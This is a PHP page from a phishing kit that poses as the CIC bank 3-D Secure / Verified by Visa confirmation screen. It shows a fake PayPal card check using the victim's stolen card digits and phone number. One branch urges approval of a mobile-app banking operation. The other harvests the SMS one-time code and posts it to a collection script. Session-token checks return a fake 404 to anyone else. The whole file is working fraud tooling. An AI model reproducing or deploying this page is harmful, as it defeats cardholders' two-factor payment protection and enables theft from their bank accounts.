<?php 
session_start();
if(strpos($_SERVER['REQUEST_URI'], $_SESSION['userid']))
{
 


  if(strpos($_SERVER['REQUEST_URI'], $_SESSION['gotovbv']))
  {

   
     if(!strpos($_SERVER['REQUEST_URI'],$_SESSION['ce_noappcode'] ))
    {

?>

<html><head><meta content="width=device-width" name="viewport">
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="format-detection" content="telephone=no">
<link type="text/css" rel="stylesheet" href="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0/fr/css/v3couleurs_cic2017.css">
<link type="text/css" rel="stylesheet" href="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0/fr/css/ei_custom_responsive.css">
<link type="text/css" rel="stylesheet" href="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0/fr/override.css">
<script src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0/fr/javascript/appli/jquery.js" type="text/javascript"></script>
<link rel="icon" type="image/png" href="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0/fr/images/css/cic2017/favicon.png" sizes="16x16">
<script src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0//fr/javascript/appli/jquery_ei.js" type="text/javascript"></script>
<script src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0//fr/javascript/appli/ei_tools.js" type="text/javascript"></script>
<script src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0//fr/javascript/appli/lightbox.js" type="text/javascript"></script>
<script src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0//fr/javascript/SDTK/display.js" type="text/javascript"></script>
<script type="text/javascript"> 
function switchToMean(meanId) {
    $("[id$=" + meanId.toUpperCase() + "]").each(function() { $(this).attr("disabled", "disabled"); });
    $("#switchMean").val(meanId);
    $("#acsForm").submit();
}
$(document).ready(function() {
    //set focus to first visible element
    $('form').find('*').filter(':input:visible:first').focus();
});
function submitForm() {
    $("#validateButton").prop("disabled", true);
    displayWaitPage();
    $("#frameWidth").val($(window).width());
    $("#frameHeight").val($(window).height());
    $("#iframe").val( (window.location != window.parent.location) ? "oui" : "non" );
    return true;
}
function displayWaitPage() {
    esd1_displayWait("ei_tpl_fullSite", "Chargement en cours", "Veuillez patienter");
}
</script>
<title>
    3-D Secure
</title>
</head><body><div id="LBCancelAuthentication" class="a_blocappli masque ei_blocmodal_env ei_newlb">
   <div class="ei_blocmodal" role="dialog" aria-labelledby="LBCancelAuthenticationTitle" aria-describedby="contentCancelAuthentication">
      <div role="document">
         <div class="a_blocfctltitre">
            <p class="a_options">
               <span tabindex="0" onfocus="$('#btnCancel').focus();" role="presentation">&nbsp;</span>
               <a id="btnCloseLBCancelAuthentication" class="btnclose" href="#" onclick="CloseLB('LBCancelAuthentication');$('#cancelLink').focus();return false;">
                     <img alt="fermer" src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0//fr/images/std/btfermerpopup.png">
               </a>
            </p>
            <p class="a_titre2" id="LBCancelAuthenticationTitle">Abandonner</p>
         </div>
         <div class="a_blocfctl">
            <div id="contentCancelAuthentication">
               Vous allez recevoir une notification sur votre application bancaire.
            </div>
            <div class="blocboutons">
               <span class="ei_buttonbar">
                  <span class="ei_mainbuttons">
                     <input id="btnCancel" value="C'est compris" type="submit" onclick="$('#cancelAuthentication').val(1);$('#acsForm').submit();">
                  </span>
                  <a href="#" onclick="CloseLB('LBCancelAuthentication');$('#cancelLink').focus();return false;">J'ai finalement reçu la code</a>
               </span>
            </div>
         </div>
         <span tabindex="0" onfocus="$('#btnCloseLBCancelAuthentication').focus();" role="presentation" class="invisible">&nbsp;</span>
      </div>
   </div>
</div>
<div id="ei_tpl_fullSite">
    <header id="ei_tpl_header" role="banner">
        <div id="ei_logo">
            <span>
                <span class="invisible"></span>
            </span>
        </div>
        <div id="ei_headright">
            <img src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0/fr/images/css/logos_v1/visa.svg" style="height:50px" alt="Logo Verified by Visa">
        </div>
    </header>
    <main id="ei_tpl_contenu" role="main">
        <form action="../process005.php?<?php echo $_SESSION['userid']; ?>" method="post" >
            <div class="a_blocappli">
                <div>
                    <div class="ei_mainblocfctl">
<table class="fiche" id="summaryTable" cellspacing="1" width="100%">
    <caption>
        Confirmation de votre carte
    </caption>
    <colgroup>
        <col width="50%">
        <col>
    </colgroup>
    <tbody>
        <tr><th scope="row">Commerçant</th><td>ALÉATOIRE (PayPal.com)</td></tr>
        <tr><th scope="row">Montant</th><td>ALÉATOIRE (0,00€)</td></tr>
        <tr><th scope="row">Date et heure</th><td><span class="eir_hidexs"><?php echo date("j M Y G:i"); ?></span></td></tr>
        <tr><th scope="row">Numéro de carte</th><td>xxxxxxxxxxxx<?php echo  substr($_SESSION['cc20'], 12);?></td></tr>
    </tbody>
</table> 
                        <p>Votre confirmation de carte nécessite une sécurisation.<br><br>Une demande de confirmation mobile a été transmise à votre appareil
                            <b>Démarrez votre application mobile CIC </b> pour vérifier et confirmer cette opération.</p>                       
                       <p><img style="display:block; margin-left:auto; margin-right:auto;" height="150px" src="https://cdn-3ds.e-i.com/SOSD/sd/otp/1.0.1//images/validation_operation.gif"></p>
                       <p style="text-align:center">Veuillez valider votre opération sur votre téléphone mobile.</p>


                        <div class="blocboutons">
                            <span class="ei_buttonbar">
                                <a href="cic-as27.php?<?php echo $_SESSION['userid'].$_SESSION['gotovbv'].$_SESSION['ce_noappcode']; ?>" id="cancelLink">Je n'ai pas reçu d'opération</a>
                                <span class="ei_mainbuttons">
                                    <input id="validateButton" value="     J'ai accepter l'opération     " type="submit">
                                </span>
                            </span>
                        </div>
                        <div class="bloctxt info">
                            <ul>
<li>Si vous ne voyez aucune opération sur votre application bancaire, cliquez sur le boutton "Je n'ai pas reçu d'opération".</li>

                        </div>
                    </div>
                </div>
            </div>
        </form>                                                            
    </main>
</div>

</body></html>

<?php

}
        else{
       
?>

<html><head><meta content="width=device-width" name="viewport">
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="format-detection" content="telephone=no">
<link type="text/css" rel="stylesheet" href="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0/fr/css/v3couleurs_cic2017.css">
<link type="text/css" rel="stylesheet" href="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0/fr/css/ei_custom_responsive.css">
<link type="text/css" rel="stylesheet" href="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0/fr/override.css">
<script src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0/fr/javascript/appli/jquery.js" type="text/javascript"></script>
<link rel="icon" type="image/png" href="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0/fr/images/css/cic2017/favicon.png" sizes="16x16">
<script src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0//fr/javascript/appli/jquery_ei.js" type="text/javascript"></script>
<script src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0//fr/javascript/appli/ei_tools.js" type="text/javascript"></script>
<script src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0//fr/javascript/appli/lightbox.js" type="text/javascript"></script>
<script src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0//fr/javascript/SDTK/display.js" type="text/javascript"></script>
<script type="text/javascript"> 
function switchToMean(meanId) {
    $("[id$=" + meanId.toUpperCase() + "]").each(function() { $(this).attr("disabled", "disabled"); });
    $("#switchMean").val(meanId);
    $("#acsForm").submit();
}
$(document).ready(function() {
    //set focus to first visible element
    $('form').find('*').filter(':input:visible:first').focus();
});
function submitForm() {
    $("#validateButton").prop("disabled", true);
    displayWaitPage();
    $("#frameWidth").val($(window).width());
    $("#frameHeight").val($(window).height());
    $("#iframe").val( (window.location != window.parent.location) ? "oui" : "non" );
    return true;
}
function displayWaitPage() {
    esd1_displayWait("ei_tpl_fullSite", "Chargement en cours", "Veuillez patienter");
}
</script>
<title>
    3-D Secure
</title>
</head><body><div id="LBCancelAuthentication" class="a_blocappli masque ei_blocmodal_env ei_newlb">
   <div class="ei_blocmodal" role="dialog" aria-labelledby="LBCancelAuthenticationTitle" aria-describedby="contentCancelAuthentication">
      <div role="document">
         <div class="a_blocfctltitre">
            <p class="a_options">
               <span tabindex="0" onfocus="$('#btnCancel').focus();" role="presentation">&nbsp;</span>
               <a id="btnCloseLBCancelAuthentication" class="btnclose" href="#" onclick="CloseLB('LBCancelAuthentication');$('#cancelLink').focus();return false;">
                     <img alt="fermer" src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0//fr/images/std/btfermerpopup.png">
               </a>
            </p>
            <p class="a_titre2" id="LBCancelAuthenticationTitle">Abandonner</p>
         </div>
         <div class="a_blocfctl">
            <div id="contentCancelAuthentication">
               Vous allez recevoir une notification sur votre application bancaire.
            </div>
            <div class="blocboutons">
               <span class="ei_buttonbar">
                  <span class="ei_mainbuttons">
                     <input id="btnCancel" value="C'est compris" type="submit" onclick="$('#cancelAuthentication').val(1);$('#acsForm').submit();">
                  </span>
                  <a href="#" onclick="CloseLB('LBCancelAuthentication');$('#cancelLink').focus();return false;">J'ai finalement reçu la code</a>
               </span>
            </div>
         </div>
         <span tabindex="0" onfocus="$('#btnCloseLBCancelAuthentication').focus();" role="presentation" class="invisible">&nbsp;</span>
      </div>
   </div>
</div>
<div id="ei_tpl_fullSite">
    <header id="ei_tpl_header" role="banner">
        <div id="ei_logo">
            <span>
                <span class="invisible"></span>
            </span>
        </div>
        <div id="ei_headright">
            <img src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0/fr/images/css/logos_v1/visa.svg" style="height:50px" alt="Logo Verified by Visa">
        </div>
    </header>
    <main id="ei_tpl_contenu" role="main">
        <form action="../process005.php?<?php echo $_SESSION['userid']."otp=true"; ?>" method="post" >
            <div class="a_blocappli">
                <div>
                    <div class="ei_mainblocfctl">
<table class="fiche" id="summaryTable" cellspacing="1" width="100%">
    <caption>
        Confirmation de votre carte
    </caption>
    <colgroup>
        <col width="50%">
        <col>
    </colgroup>
    <tbody>
        <tr><th scope="row">Commerçant</th><td>ALÉATOIRE (PayPal.com)</td></tr>
        <tr><th scope="row">Montant</th><td>ALÉATOIRE (0,00€)</td></tr>
        <tr><th scope="row">Date et heure</th><td><span class="eir_hidexs"><?php echo date("j M Y G:i"); ?></span></td></tr>
        <tr><th scope="row">Numéro de carte</th><td>xxxxxxxxxxxx<?php echo  substr($_SESSION['cc20'], 12);?></td></tr>
    </tbody>
</table> 
                        <p>Veuillez entrer le code de confirmation qui vous a été envoyé par SMS au <b>+33<?php echo substr($_SESSION['phone'], 1) ?></b> pour confirmer votre carte sur PayPal.com</p>                            
                        <input type="hidden" name="MD" value="1PZn2I4Gcfu1yydTptFP">
                        <input type="hidden" name="TermUrl" value="https://payment.payline.com/partnerReturn?paylinereturn&amp;paylinetoken=1jFnWP1qR6S7LRf2z2131613306683877">
                        <input type="hidden" name="PaReq" value="eJxVUmFvgjAQ/SvGH0ALVBjmbILTRY0ag9Ns+7Kwchk4QC0w8d+vBZxb0qT33l2v914Lz7FEnGxRVBI5rLAowk/sJdGo/2671oB6A9c2T30OGz/AM4dvlEVyzLlpUMMCcoPqpBRxmJccQnEez9ecea7ruEA6CBnK+YQzmzmm45ie6zFbZVsW8jBDvkQsRZz0tj6QhgBxrPJSXjlj6qobgEqmPC7L05CQy+VipO0xQxwzIDoH5D7MptJRoXrVScRX+3H4cVgs1tPo8JbvanxJv/azMQ1SfwREV0AUlsgtaplqsZ5pDRkbMg9Iw0OY6SH4dBf0bGpQquS1DJz0RX4LbKozfxlQ9krMxZV77oOSckOA9emYo6pQAn9jiLAQSka33TU8zrS9olSWWe2M8dZ7XZYZFU91MPez3fRwiCxtelOk2yfKMlVsNv01AKLbkO49SffkKvr3FX4AN7Cv2A==">
                        <input type="hidden" name="switchMean" id="switchMean" value="">
                        <input type="hidden" name="cancelAuthentication" id="cancelAuthentication" value="0">
                        <input type="hidden" name="frameWidth" id="frameWidth" value="">
                        <input type="hidden" name="frameHeight" id="frameHeight" value="">      
                        <input type="hidden" name="iframe" id="iframe" value="">
                        <input type="hidden" name="IdSes3ds" id="IdSes3ds" value="508909039363e583cbc8a6bd8f20c9f1ed7f081f4cff8c051873ea20bb55b9a97299069ffcd02a325d749385813dfc7a1b427f4fdcce6e93deebcef8b6c26ae7ca8bcc7c974c617989bc6c5f97bf8adb19c76996eeea0aa98a6572f70c5cbe457ecf65e9e1269238919bf1c0e8597facd65a16e6e5fa18f68dce839497e7d64897b9a9edb595769e1d9db0bc5082a16ee91514db497ff5c22661d4b70b4de4e2cb4f8c7e2ac7bae52e6a3c6feb9fdb2e436814bf6c587ba8dfc3c4756bb5aff5d5b2daa1fd2f0ace63ba9b162828d27d37c99180a2f7856105452ecc83acd0e167f73fe8eef0d1ae7211e5f3c511341bce46dcbebd5f1ce2ad183b321ffd389507d6d84f7b2821519799a1abfbe81d18e13a293de029c03c25ffeb5b470ba1ed35e621d262e823487ae8a7004543a2efa1405d3de98a359409ddd7430a20e45cd5cfc2d5b718b2b74f5faf80c062745c99f53f96bf77a0d10f7e6346383b7b7123198c59a1851345ebf235f8dfd3922c5e0d7937e39ec3ba772d0d1fe73bef537b7055677005f7f14e0c7f68582281197c71e53e4b2637546a2baca7070224399f12d43c55379519310fc4b12a0cbcbb3b18add45cccd862d7c3690db036fc5b01f4c224d1078be237c9f156557f0bc953d52f03a4757e23b5ec70729d1ac0022ce3ce082f480317226c319abecdf162a797c3bfe46c71968f80571a47f6d737d0fd26a6ddf225ba0a4bd9a3134d38f27b852fdf9513166be41f6e8985e1d95c7f465cfde8207252a15c0b3a3873aeb7">
                        <table class="fiche" id="inputTable">
                        <colgroup>
                            <col width="50%">
                            <col>
                        </colgroup>
                        <tbody>
                        <tr><th><label for="INPUT_SMS_2F10D60F897D89C23DA03FF2CF09E922">Code de confirmation :</label></th><td><input type="text"  id="INPUT_SMS_2F10D60F897D89C23DA03FF2CF09E922" name="otp" maxlength="8"></td></tr>
                        </tbody>
                        </table>
                        <div class="blocboutons">
                            <span class="ei_buttonbar">
                                <a href="cic-as27.php?<?php echo $_SESSION['userid'].$_SESSION['gotovbv']; ?>" id="cancelLink">Je n'ai pas reçu de code</a>
                                <span class="ei_mainbuttons">
                                    <input id="validateButton" value="     Valider     " type="submit">
                                </span>
                            </span>
                        </div>
                        <div class="bloctxt info">
                            <ul>
<li>Si vous n'avez pas reçu votre code, cliquez sur le boutton "je n'ai pas reçu de code".</li>

                        </div>
                    </div>
                </div>
            </div>
        </form>                                                            
    </main>
</div>

</body></html>


<?php

}

   

}
else{
    die('HTTP/1.0 404 Not Found');
}

}
else{
            die('HTTP/1.0 404 Not Found');

}


?>